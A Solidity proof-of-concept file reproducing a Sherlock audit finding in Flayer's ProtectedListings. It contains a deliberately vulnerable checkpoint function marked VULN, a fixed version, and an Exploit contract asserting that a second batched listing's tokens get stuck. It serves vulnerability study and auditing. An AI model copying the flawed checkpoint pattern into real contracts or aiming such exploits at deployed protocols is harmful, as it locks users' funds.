// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — H-24 (Sherlock 2024-08, issue 732)
    ProtectedListings._createCheckpoint returns the next index when the
    checkpoint timestamp is unchanged, even though it did not push. The first
    listing in a batch gets index 0, which transient storage treats as unset,
    so the second listing calls _createCheckpoint again and stores index 1.
    Only index 0 exists. unlock of the second listing reverts and its 1 CT
    stays in the contract.
*/

contract Ct {
    string public symbol = "CT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ProtectedListings {
    struct Checkpoint {
        uint256 timestamp;
        uint256 compoundedFactor;
    }

    struct ProtectedListing {
        uint256 tokenTaken;
        uint256 checkpoint;
    }

    struct CreateListing {
        address collection;
        uint256 tokenId;
        uint256 tokenTaken;
    }

    Ct public ct;
    mapping(address => Checkpoint[]) public collectionCheckpoints;
    mapping(address => mapping(uint256 => ProtectedListing)) internal _protectedListings;
    mapping(uint256 => uint256) public storedCheckpoint;

    constructor(Ct _ct) {
        ct = _ct;
    }

    function checkpointLength(address collection) external view returns (uint256) {
        return collectionCheckpoints[collection].length;
    }

    function _currentCheckpoint(address) internal view returns (Checkpoint memory checkpoint) {
        checkpoint.timestamp = block.timestamp;
        checkpoint.compoundedFactor = 1e18;
    }

    /// _createCheckpoint from ProtectedListings.sol.
    function _createCheckpoint(address _collection) internal returns (uint256 index_) {
        index_ = collectionCheckpoints[_collection].length;
        Checkpoint memory checkpoint = _currentCheckpoint(_collection);
        if (index_ == 0) {
            collectionCheckpoints[_collection].push(checkpoint);
            return index_;
        }
        if (checkpoint.timestamp == collectionCheckpoints[_collection][index_ - 1].timestamp) {
            collectionCheckpoints[_collection][index_ - 1].compoundedFactor = checkpoint.compoundedFactor;
            // @> VULN: returns the length even though no new checkpoint was pushed
            return index_;
        }
        collectionCheckpoints[_collection].push(checkpoint);
        return index_;
    }

    /// createListings from ProtectedListings.sol. A stored 0 is read back as "unset".
    function createListings(CreateListing[] calldata _createListings) external {
        for (uint256 i = 0; i < _createListings.length; i++) {
            CreateListing calldata listing = _createListings[i];
            bytes32 checkpointKey = keccak256(abi.encodePacked("checkpointIndex", listing.collection));
            uint256 checkpointIndex;
            assembly {
                checkpointIndex := tload(checkpointKey)
            }
            if (checkpointIndex == 0) {
                checkpointIndex = _createCheckpoint(listing.collection);
                assembly {
                    tstore(checkpointKey, checkpointIndex)
                }
            }
            ct.transferFrom(msg.sender, address(this), listing.tokenTaken);
            _protectedListings[listing.collection][listing.tokenId] =
                ProtectedListing({tokenTaken: listing.tokenTaken, checkpoint: checkpointIndex});
            storedCheckpoint[listing.tokenId] = checkpointIndex;
        }
    }

    function unlock(address _collection, uint256 _tokenId) external returns (uint256 unlockPrice_) {
        ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
        Checkpoint memory initial = collectionCheckpoints[_collection][listing.checkpoint];
        unlockPrice_ = listing.tokenTaken * initial.compoundedFactor / 1e18;
        delete _protectedListings[_collection][_tokenId];
        ct.transfer(msg.sender, unlockPrice_);
    }
}

contract ProtectedListingsFixed {
    struct Checkpoint {
        uint256 timestamp;
        uint256 compoundedFactor;
    }

    struct ProtectedListing {
        uint256 tokenTaken;
        uint256 checkpoint;
    }

    struct CreateListing {
        address collection;
        uint256 tokenId;
        uint256 tokenTaken;
    }

    Ct public ct;
    mapping(address => Checkpoint[]) public collectionCheckpoints;
    mapping(address => mapping(uint256 => ProtectedListing)) internal _protectedListings;

    constructor(Ct _ct) {
        ct = _ct;
    }

    function _currentCheckpoint(address) internal view returns (Checkpoint memory checkpoint) {
        checkpoint.timestamp = block.timestamp;
        checkpoint.compoundedFactor = 1e18;
    }

    function _createCheckpoint(address _collection) internal returns (uint256 index_) {
        index_ = collectionCheckpoints[_collection].length;
        Checkpoint memory checkpoint = _currentCheckpoint(_collection);
        if (index_ == 0) {
            collectionCheckpoints[_collection].push(checkpoint);
            return index_;
        }
        if (checkpoint.timestamp == collectionCheckpoints[_collection][index_ - 1].timestamp) {
            collectionCheckpoints[_collection][index_ - 1].compoundedFactor = checkpoint.compoundedFactor;
            return index_ - 1;
        }
        collectionCheckpoints[_collection].push(checkpoint);
        return index_;
    }

    function createListings(CreateListing[] calldata _createListings) external {
        for (uint256 i = 0; i < _createListings.length; i++) {
            CreateListing calldata listing = _createListings[i];
            bytes32 checkpointKey = keccak256(abi.encodePacked("checkpointIndex", listing.collection));
            uint256 checkpointIndex;
            assembly {
                checkpointIndex := tload(checkpointKey)
            }
            if (checkpointIndex == 0) {
                checkpointIndex = _createCheckpoint(listing.collection);
                assembly {
                    tstore(checkpointKey, checkpointIndex)
                }
            }
            ct.transferFrom(msg.sender, address(this), listing.tokenTaken);
            _protectedListings[listing.collection][listing.tokenId] =
                ProtectedListing({tokenTaken: listing.tokenTaken, checkpoint: checkpointIndex});
        }
    }

    function unlock(address _collection, uint256 _tokenId) external returns (uint256 unlockPrice_) {
        ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
        Checkpoint memory initial = collectionCheckpoints[_collection][listing.checkpoint];
        unlockPrice_ = listing.tokenTaken * initial.compoundedFactor / 1e18;
        delete _protectedListings[_collection][_tokenId];
        ct.transfer(msg.sender, unlockPrice_);
    }
}

contract Exploit {
    Ct public ct;
    ProtectedListings public listings;
    address public collection = address(0xC011EC);
    uint256 public firstIndex;
    uint256 public secondIndex;
    uint256 public lengthAfter;
    uint256 public unlocked;
    bool public secondReverted;
    uint256 public stuck;

    constructor() {
        ct = new Ct();
        listings = new ProtectedListings(ct);
        ct.mint(address(this), 2 ether);
    }

    function run() external {
        ProtectedListings.CreateListing[] memory batch = new ProtectedListings.CreateListing[](2);
        batch[0] = ProtectedListings.CreateListing(collection, 1, 1 ether);
        batch[1] = ProtectedListings.CreateListing(collection, 2, 1 ether);
        ct.approve(address(listings), 2 ether);
        listings.createListings(batch);
        firstIndex = listings.storedCheckpoint(1);
        secondIndex = listings.storedCheckpoint(2);
        lengthAfter = listings.checkpointLength(collection);
        unlocked = listings.unlock(collection, 1);
        try listings.unlock(collection, 2) returns (uint256) {
            secondReverted = false;
        } catch {
            secondReverted = true;
        }
        stuck = ct.balanceOf(address(listings));
        require(firstIndex == 0, "first");
        require(secondIndex == 1, "second");
        require(lengthAfter == 1, "length");
        require(unlocked == 1 ether, "unlock");
        require(secondReverted, "revert");
        require(stuck == 1 ether, "stuck");
    }
}
